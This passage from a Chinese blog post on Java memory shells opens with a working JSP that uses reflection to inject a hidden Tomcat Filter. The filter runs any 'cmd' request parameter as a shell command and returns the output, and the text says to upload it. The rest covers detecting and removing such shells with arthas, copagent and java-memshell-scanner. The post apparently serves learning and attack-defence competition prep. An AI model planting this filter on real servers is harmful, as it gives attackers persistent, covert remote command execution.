
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner( in ).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.getWriter().write(output);
                    servletResponse.getWriter().flush();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {

            }

        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name, filterConfig);
        out.print("Inject Success !");
    }
%>
<html>
<head>
    <title>filter</title>
</head>
<body>
    Hello Filter
</body>
</html>
```

到时候上传这个 jsp 马即可

## 0x05 排查 Java 内存马的几个方法

感觉内存马的排查也是很重要的，因为最近也要准备 AWD 了，所以先整理一下这些防御的内容

这里的内容参考木头师傅

http://wjlshare.com/archives/1529

### arthas

项目链接：https://github.com/alibaba/arthas

我们可以利用该项目来检测我们的内存马

```
java -jar arthas-boot.jar --telnet-port 9998 --http-port -1
```

这里也可以直接 `java -jar arthas-boot.jar`

这里选择我们 Tomcat 的进程

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png)

输入 1 之后会进入如下进程

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png)

利用 `sc *.Filter` 进行模糊搜索，会列出所有调用了 Filter 的类？

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SCAllFilter.png)

利用`jad --source-only org.apache.jsp.evil_jsp` 直接将 Class 进行反编译，这样就完成了防御。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JarClass.png)

同时也可以进行监控 ，当我们访问 url 就会输出监控结果

```
watch org.apache.catalina.core.ApplicationFilterFactory createFilterChain 'returnObj.filters.{?#this!=null}.{filterClass}'
```

### copagent

项目链接：https://github.com/LandGrey/copagent

也是一款可以检测内存马的工具

### java-memshell-scanner

项目链接：https://github.com/c0ny1/java-memshell-scanner

c0ny1 师傅写的检测内存马的工具，能够检测并且进行删除，是一个非常方便的工具，工具界面如图

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/MemshellScanner.png)

该工具是由 jsp 实现的，我们这里主要来学习一下 c0ny1 师傅 删除内存马的逻辑

检测是通过遍历 filterMaps 中的所有 filterMap 然后显示出来，让我们自己认为判断，所以这里提供了 dumpclass

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterMapScan.png)

删除的话，这里主要是通过反射调用 StandardContext#removeFilterDef 方法来进行删除

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/InvokerScanner.png)

## 0x06 小结

这么学习下来感觉内存马的注入，不知道怎么具体实现，总的来说可以归结为获取到 StandContext，然后通过反射注入。表现形式为 Filter。具体的实施可以是上传 .jsp 文件

## 0x07 参考资料

http://wjlshare.com/archives/1529
https://blog.csdn.net/qq_34101364/article/details/120856415
https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext